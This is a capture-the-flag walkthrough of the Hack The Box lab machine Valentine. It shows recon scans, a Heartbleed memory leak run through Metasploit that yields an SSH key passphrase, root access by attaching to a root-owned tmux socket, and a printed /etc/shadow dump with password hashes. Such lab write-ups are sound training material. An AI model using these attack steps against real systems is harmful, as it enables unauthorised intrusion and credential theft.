# Hackthebox 

Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.


## Recon

### Service Discovey

First, as always. we perform our initial enumeration of the box using Nmap.

```
# Nmap 7.70 scan initiated Wed Dec  5 11:39:08 2018 as: nmap -v -sV -p- -T4 -oA valentine_full_tcp 10.10.10.79
Failed to resolve "full_tcp".
Nmap scan report for 10.10.10.79
Host is up (0.079s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
The SSH and web service indicates that the OS is Ubuntu 12.04 "Precise Pangolin".


Let's run some vulnerability scans against the web services.

Nikto:

```
root@kali:~/htb/valentine# nikto -h 10.10.10.79                                                                                                                                                     
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.79
+ Target Hostname:    10.10.10.79
+ Target Port:        80
+ Start Time:         2018-12-05 11:49:45 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.26
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS                                                                           
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type                                           
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.                                                              
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.                             
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.                             
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.                             
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.                             
+ OSVDB-3268: /dev/: Directory indexing found.
+ OSVDB-3092: /dev/: This might be interesting...
+ Server leaks inodes via ETags, header found with file /icons/README, inode: 534222, size: 5108, mtime: Tue Aug 28 12:48:10 2007                                                                   
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8310 requests: 0 error(s) and 16 item(s) reported on remote host
+ End Time:           2018-12-05 12:00:49 (GMT1) (664 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Nmap:

```
# Nmap 7.70 scan initiated Wed Dec  5 11:50:54 2018 as: nmap -v -sV -p80,443 --script vuln -oA http_vuln 10.10.10.79 
Nmap scan report for 10.10.10.79
Host is up (0.071s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum:
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /index/: Potentially interesting folder
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum:
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /index/: Potentially interesting folder
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| ssl-ccs-injection:
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|
|     References:
|       http://www.cvedetails.com/cve/2014-0224
|       http://www.openssl.org/news/secadv_20140605.txt
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
| ssl-heartbleed:
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.         
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.                                             
|
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://cvedetails.com/cve/2014-0160/
|_      http://www.openssl.org/news/secadv_20140407.txt
| ssl-poodle:
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  OSVDB:113251  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       http://osvdb.org/113251
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|_      https://www.imperialviolet.org/2014/10/14/poodle.html
|_sslv2-drown:

```


### Content Discovery 

Running gobuster at the host shows some interesting directories. 

```
root@kali:~/htb/valentine# gobuster -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-la
rge-directories.txt -u http://10.10.10.79

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.79/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2018/12/05 11:53:32 Starting gobuster
=====================================================
/dev (Status: 301)
/index (Status: 200)
/server-status (Status: 403)
Progress: 6839 / 62291 (10.98%)^[[3~scan report for 10.10.10.79
/encode (Status: 200)
=====================================================
2018/12/05 12:01:46 Finished
=====================================================
```

Nikto and Nmap also found the /dev directory which has directory listing enabled, let's check that out.

http://10.10.10.79/dev/notes.txt

```
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```


On http://10.10.10.79/dev/hype_key we find the follwing content:

```
2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 
50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 
20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 
38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 
6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 
46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 
4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 
2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 
6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 
4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 
2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 
6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 
6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 
4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 
53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 
65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 
53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 
6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 
63 77 6e 53 64 64 48 57 38 57 33 4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 
6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 
30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 
70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 
74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 
36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 
75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 
50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 
38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 
75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 
73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 
46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 
58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 
45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 
2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 
58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 
2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 62 
53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 
48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 
52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 
57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 
55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 
75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 
38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 
43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 
36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 
4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 
4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 
49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 
4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 49 44 
76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 
4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 
57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 
5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 
75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 
2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 
41 54 45 20 4b 45 59 2d 2d 2d 2d 2d
```

If we convert the hex text blob to ascii we get the following text:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

Trying to use the key with ssh to log in to the box as root, but the key is encrypted and requires a password.


## Initial Compromise

So the Nmap vulnerability scan picked up that the victim is vulnerable to the heartbleed bug. And the name of the box also suggests that it may have something to do with this. 

There is a Metasploit module to scan for the vulnerability on servers. If we enable verbose output on that module, it will also dump some of the memory to our screen.

```
msf auxiliary(scanner/ssl/openssl_heartbleed) > exploit                                                                                                                                                                                                                                                                                                                                                   
[*] 10.10.10.79:443       - Leaking heartbeat response #1                                                                                                                                            
[*] 10.10.10.79:443       - Sending Client Hello...                                                                                                                                                  
[*] 10.10.10.79:443       - SSL record #1:                                                                                                                                                           
[*] 10.10.10.79:443       -     Type:    22                                                                                                                                                          
[*] 10.10.10.79:443       -     Version: 0x0301                                                                                                                                                      
[*] 10.10.10.79:443       -     Length:  86                                                                                                                                                          
[*] 10.10.10.79:443       -     Handshake #1:                                                                                                                                                        
[*] 10.10.10.79:443       -             Length: 82                                                                                                                                                   
[*] 10.10.10.79:443       -             Type:   Server Hello (2)                                                                                                                                     
[*] 10.10.10.79:443       -             Server Hello Version:           0x0301                                                                                                                       
[*] 10.10.10.79:443       -             Server Hello random data:       5c07b339c30c1bce4e242adfec9f3464241121da81ca1fa52452887bdc81b548                                                             
[*] 10.10.10.79:443       -             Server Hello Session ID length: 32                                                                                                                           
[*] 10.10.10.79:443       -             Server Hello Session ID:        9fab0ed242a9deb110cd97e32fcc70d6a44c378232dc7cb9fec944fdf075fb92                                                             
[*] 10.10.10.79:443       - SSL record #2:                                                                                                                                                           
[*] 10.10.10.79:443       -     Type:    22                                                                                                                                                         
[*] 10.10.10.79:443       -     Version: 0x0301                                                                                                                                                      
[*] 10.10.10.79:443       -     Length:  885                                                                                                                                                         
[*] 10.10.10.79:443       -     Handshake #1:                                                                                                                                                        
[*] 10.10.10.79:443       -             Length: 881                                                                                                                                                  
[*] 10.10.10.79:443       -             Type:   Certificate Data (11)                                                                                                                                
[*] 10.10.10.79:443       -             Certificates length: 878                                                                                                                                    
[*] 10.10.10.79:443       -             Data length: 881                                                                                                                                            
[*] 10.10.10.79:443       -             Certificate #1:                                                                                                                                             
[*] 10.10.10.79:443       -                     Certificate #1: Length: 875                                                                                                                         
[*] 10.10.10.79:443       -                     Certificate #1: #<OpenSSL::X509::Certificate: subject=#<OpenSSL::X509::Name CN=valentine.htb,O=valentine.htb,ST=FL,C=US>, issuer=#<OpenSSL::X509::Name CN=valentine.htb,O=valentine.htb,ST=FL,C=US>, serial=#<OpenSSL::BN:0x00007fd181c68a68>, not_before=2018-02-06 00:45:25 UTC, not_after=2019-02-06 00:45:25 UTC>                                     
[*] 10.10.10.79:443       - SSL record #3:                                                                                                                                                          
[*] 10.10.10.79:443       -     Type:    22                                                                                                                                                          
[*] 10.10.10.79:443       -     Version: 0x0301                                                                                                                                                     
[*] 10.10.10.79:443       -     Length:  331                                                                                                                                                        
[*] 10.10.10.79:443       -     Handshake #1:                                                                                                                                                        
[*] 10.10.10.79:443       -             Length: 327
[*] 10.10.10.79:443       -             Type:   Server Key Exchange (12)
[*] 10.10.10.79:443       - SSL record #4:
[*] 10.10.10.79:443       -     Type:    22
[*] 10.10.10.79:443       -     Version: 0x0301
[*] 10.10.10.79:443       -     Length:  4
[*] 10.10.10.79:443       -     Handshake #1:
[*] 10.10.10.79:443       -             Length: 0
[*] 10.10.10.79:443       -             Type:   Server Hello Done (14)
[*] 10.10.10.79:443       - Sending Heartbeat...
[*] 10.10.10.79:443       - Heartbeat response, 65535 bytes
[+] 10.10.10.79:443       - Heartbeat response with leak, 65535 bytes
[*] 10.10.10.79:443       - Printable info leaked:
......\....$(....[.SV.(l.....#.<q]6..b..f.....".!.9.8.........5.............................3.2.....E.D...../...A.......................................ux i686; rv:45.0) Gecko/20100101 Firefox/45.0..Referer: https://127.0.0.1/decode.php..Content-Type: application/x-www-form-urlencoded..Content-Length: 42....$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==hl";....k...E.R4...j..................................................................................................................................... repeated 15750 times .....................................................................................................................................@.....................................................................................................................................
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

From that memory dump we can the following interesting string `Referer: https://127.0.0.1/decode.php..Content-Type: application/x-www-form-urlencoded..Content-Length: 42....$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==hl`. 


It looks like a decode scipt with a variable containing a base64 endode value. We may need to run the scan a couple of times to extract the correct information from the memory.

The decoded value reads "heartbleedbelievethehype". Let's use that as the password for the private ssh-key we hold.


```
root@kali:~/htb/valentine# ssh -i private.key hype@10.10.10.79
Enter passphrase for key 'private.key': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ 
hype@Valentine:~$ id
uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)
hype@Valentine:~$ 
```

## Pivilege Escalation

A typical Linux privilege escalation method is based on one of the following:

1. Exploiting services running as root
2. Exploiting SUID executables
3. Exploiting SUDO rights/user
4. Exploiting badly configured cron jobs
5. Exploiting users with "." in their path
6. Kernel Exploits

Kernel exploits are typically our last resort, as there is a risk that we crash the system in the process. 

In this case we are able to use number 1 to gain elevated privileges.

After uploading a script (LinEnum.sh) that runs a lot of checks for us we see the following interesting stuff:

We have a kernel from 2012 that there is a high chance it could be vulnerable.

`Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux` 

Tmux seems to be installed which is not that common on these boxes:

```
[-] Available shells:                                                       
# /etc/shells: valid login shells                                                               
/bin/sh                                                                      
/bin/dash                                                                          
/bin/bash                                                                                  
/bin/rbash                                                                                 
/usr/bin/tmux                                                                                     
```

We also see in the list of running processes that tmux is running as root and that there seems to be a tmux session open called "dev_sess":
```
root       1002  0.0  0.1  26416  1672 ?        Ss   02:38   0:00 /usr/bin/tmux -S /.devs/dev_sess
```

So if we try to attach to that running tmux session we actually get a root shell.

```
hype@Valentine:~$ tmux -S /.devs/dev_sess


root@Valentine:/home/hype# id
uid=0(root) gid=0(root) groups=0(root)
root@Valentine:/home/hype# 
```

We could also most likley use Dirty Cow to gain root as well. 

## Dumping Credentials

/etc/shadow:

```
root:$6$ZC6nSRoi$CLMvXwpiQymsSLYvvF69IpKR8eZkGdZCBokSCTwaUM0x/AfdcSGCSHHFEcam6jyYurcrlXxeSmXkjUlBnXTN2.:17568:0:99999:7:::
daemon:*:15455:0:99999:7:::
bin:*:15455:0:99999:7:::
sys:*:15455:0:99999:7:::
sync:*:15455:0:99999:7:::
games:*:15455:0:99999:7:::
man:*:15455:0:99999:7:::
lp:*:15455:0:99999:7:::
mail:*:15455:0:99999:7:::
news:*:15455:0:99999:7:::
uucp:*:15455:0:99999:7:::
proxy:*:15455:0:99999:7:::
www-data:*:15455:0:99999:7:::
backup:*:15455:0:99999:7:::
list:*:15455:0:99999:7:::
irc:*:15455:0:99999:7:::
gnats:*:15455:0:99999:7:::
nobody:*:15455:0:99999:7:::
libuuid:!:15455:0:99999:7:::
syslog:*:15455:0:99999:7:::
messagebus:*:15455:0:99999:7:::
colord:*:15455:0:99999:7:::
lightdm:*:15455:0:99999:7:::
whoopsie:*:15455:0:99999:7:::
avahi-autoipd:*:15455:0:99999:7:::
avahi:*:15455:0:99999:7:::
usbmux:*:15455:0:99999:7:::
kernoops:*:15455:0:99999:7:::
pulse:*:15455:0:99999:7:::
rtkit:*:15455:0:99999:7:::
speech-dispatcher:!:15455:0:99999:7:::
hplip:*:15455:0:99999:7:::
saned:*:15455:0:99999:7:::
hype:$6$vKbykTIV$OCrqMLxv1QcjfhtGMyzzEfhevoTe7sO.v3o1SL3S6wCDc0pXsZvrayn/Wy.TEQuCJWsKLXUh7LakSgTnN/496/:17568:0:99999:7:::
sshd:*:17511:0:99999:7:::
```